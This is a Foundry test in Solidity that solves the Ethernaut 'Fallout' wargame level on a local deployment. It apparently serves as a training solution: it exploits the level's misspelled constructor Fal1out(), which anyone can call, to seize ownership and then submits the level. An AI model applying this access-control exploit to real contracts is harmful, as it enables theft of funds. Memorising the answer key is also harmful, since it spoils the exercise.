// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {Statistics} from "src/metrics/Statistics.sol";
import {FalloutFactory} from "src/levels/FalloutFactory.sol";

interface IFallout {
    function Fal1out() external payable;
}

contract FalloutTest is Test {
    Ethernaut public ethernaut;
    FalloutFactory public falloutFactory;
    address public immutable PLAYER = makeAddr("PLAYER");

    function setUp() public {
        // ----------------------------------
        // Deploy ethernaut contract
        // ----------------------------------
        Statistics statistics = new Statistics();
        ethernaut = new Ethernaut();
        statistics.initialize(address(ethernaut));
        ethernaut.setStatistics(address(statistics));

        // ----------------------------------
        // Register level
        // ----------------------------------
        falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
    }

    function test_Fallout() public {
        IFallout target;

        vm.startPrank(PLAYER);
        vm.recordLogs();

        // ----------------------------------
        // Create level instance
        // ----------------------------------
        ethernaut.createLevelInstance(falloutFactory);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        target = IFallout(
            payable(address(uint160(uint256(entries[0].topics[2]))))
        );

        // ----------------------------------
        // Initiate attack
        // ----------------------------------
        vm.deal(PLAYER, 1 ether);

        // There's a typo in constructor function, anyone can call that function
        target.Fal1out();

        // ----------------------------------
        // Validate
        // ----------------------------------
        ethernaut.submitLevelInstance(payable(address(target)));
        entries = vm.getRecordedLogs();
        assertEq(entries.length, 2);
    }
}
